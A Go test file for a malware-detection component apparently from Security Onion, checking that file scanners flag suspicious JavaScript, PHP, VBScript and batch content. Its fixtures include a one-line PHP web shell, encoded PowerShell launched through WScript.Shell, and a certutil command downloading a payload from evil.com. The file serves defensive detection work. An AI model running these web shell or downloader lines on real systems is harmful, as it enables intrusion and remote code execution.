// Copyright Security Onion Solutions LLC and/or licensed to Security Onion Solutions LLC under one
// or more contributor license agreements. Licensed under the Elastic License 2.0 as shown at
// https://securityonion.net/license; you may not use this file except in compliance with the
// Elastic License 2.0.

package fileanalyze

import (
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestJavascriptScanner(t *testing.T) {
	s := NewJavascriptScanner()
	assert.Equal(t, "ScanJavascript", s.Name())

	js := []byte(`
		function hello() {
			var x = 1;
			eval(atob("YWxlcnQoMSk="));
			document.write("<script>alert(1)</script>");
		}
	`)

	result, err := s.Scan(js, FileMetadata{Name: "test.js"})
	require.NoError(t, err)

	suspicious := result.Data["suspicious"].([]interface{})
	assert.Contains(t, suspicious, "eval()")
	assert.Contains(t, suspicious, "document.write()")
	assert.Contains(t, suspicious, "base64_encoding")
}

func TestJavascriptScannerClean(t *testing.T) {
	s := NewJavascriptScanner()

	js := []byte(`function add(a, b) { return a + b; }`)
	result, err := s.Scan(js, FileMetadata{Name: "clean.js"})
	require.NoError(t, err)

	_, hasSuspicious := result.Data["suspicious"]
	assert.False(t, hasSuspicious)
}

func TestPhpScanner(t *testing.T) {
	s := NewPhpScanner()
	assert.Equal(t, "ScanPhp", s.Name())

	php := []byte(`<?php eval(base64_decode($_POST['cmd'])); system('ls'); ?>`)
	result, err := s.Scan(php, FileMetadata{Name: "shell.php"})
	require.NoError(t, err)

	suspicious := result.Data["suspicious"].([]interface{})
	assert.Contains(t, suspicious, "eval()")
	assert.Contains(t, suspicious, "command_execution")
	assert.Contains(t, suspicious, "base64_decode()")
	assert.Contains(t, suspicious, "user_input_to_execution")
}

func TestVbScanner(t *testing.T) {
	s := NewVbScanner()
	assert.Equal(t, "ScanVb", s.Name())

	vbs := []byte(`Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell -enc abc123"`)

	result, err := s.Scan(vbs, FileMetadata{Name: "test.vbs"})
	require.NoError(t, err)

	suspicious := result.Data["suspicious"].([]interface{})
	assert.Contains(t, suspicious, "CreateObject")
	assert.Contains(t, suspicious, "WScript.Shell")
	assert.Contains(t, suspicious, "PowerShell")
}

func TestBatchScanner(t *testing.T) {
	s := NewBatchScanner()
	assert.Equal(t, "ScanBatch", s.Name())

	bat := []byte(`@echo off
powershell -encodedcommand JABjAGwA
certutil -urlcache -split -f http://evil.com/payload.exe
`)

	result, err := s.Scan(bat, FileMetadata{Name: "test.bat"})
	require.NoError(t, err)

	suspicious := result.Data["suspicious"].([]interface{})
	assert.Contains(t, suspicious, "PowerShell")
	assert.Contains(t, suspicious, "encoded_command")
	assert.Contains(t, suspicious, "certutil")
}

func TestBatchScannerClean(t *testing.T) {
	s := NewBatchScanner()

	bat := []byte(`@echo off
echo Hello World
pause
`)

	result, err := s.Scan(bat, FileMetadata{Name: "clean.bat"})
	require.NoError(t, err)

	_, hasSuspicious := result.Data["suspicious"]
	assert.False(t, hasSuspicious)
}

func TestBase64PeScanner(t *testing.T) {
	s := NewBase64PeScanner()
	assert.Equal(t, "ScanBase64PE", s.Name())
	assert.Equal(t, 10, s.Priority()) // Low priority
}

func TestBase64PeScannerNoMatch(t *testing.T) {
	s := NewBase64PeScanner()

	result, err := s.Scan([]byte("just some normal text"), FileMetadata{Name: "test.txt"})
	assert.NoError(t, err)
	assert.Nil(t, result)
}

func TestDonutScanner(t *testing.T) {
	s := NewDonutScanner()
	assert.Equal(t, "ScanDonut", s.Name())

	// No donut signature
	result, err := s.Scan([]byte("regular data"), FileMetadata{Name: "test.bin"})
	assert.NoError(t, err)
	assert.Nil(t, result)

	// With donut signature
	data := append([]byte("prefix"), donutMagic...)
	data = append(data, []byte("suffix")...)
	result, err = s.Scan(data, FileMetadata{Name: "test.bin"})
	assert.NoError(t, err)
	assert.True(t, result.Data["detected"].(bool))
}

func TestSwfScanner(t *testing.T) {
	s := NewSwfScanner()
	assert.Equal(t, "ScanSwf", s.Name())
	assert.Contains(t, s.Flavors(), "application/x-shockwave-flash")
}

func TestSwfScannerTooShort(t *testing.T) {
	s := NewSwfScanner()
	result, err := s.Scan([]byte("FW"), FileMetadata{Name: "test.swf"})
	assert.NoError(t, err)
	assert.Nil(t, result)
}

func TestSwfScannerNotSwf(t *testing.T) {
	s := NewSwfScanner()
	result, err := s.Scan([]byte("NOT_SWF_DATA"), FileMetadata{Name: "test.bin"})
	assert.NoError(t, err)
	assert.Nil(t, result)
}

func TestUpxScannerNoSignature(t *testing.T) {
	s := NewUpxScanner()
	assert.Equal(t, "ScanUpx", s.Name())
	assert.Equal(t, 8, s.Priority()) // After PE/ELF

	// No UPX signature
	result, err := s.Scan([]byte("regular binary data"), FileMetadata{Name: "test.exe"})
	assert.NoError(t, err)
	assert.Nil(t, result)
}

func TestIsBase64Char(t *testing.T) {
	assert.True(t, isBase64Char('A'))
	assert.True(t, isBase64Char('z'))
	assert.True(t, isBase64Char('0'))
	assert.True(t, isBase64Char('+'))
	assert.True(t, isBase64Char('/'))
	assert.True(t, isBase64Char('='))
	assert.False(t, isBase64Char(' '))
	assert.False(t, isBase64Char('\n'))
}
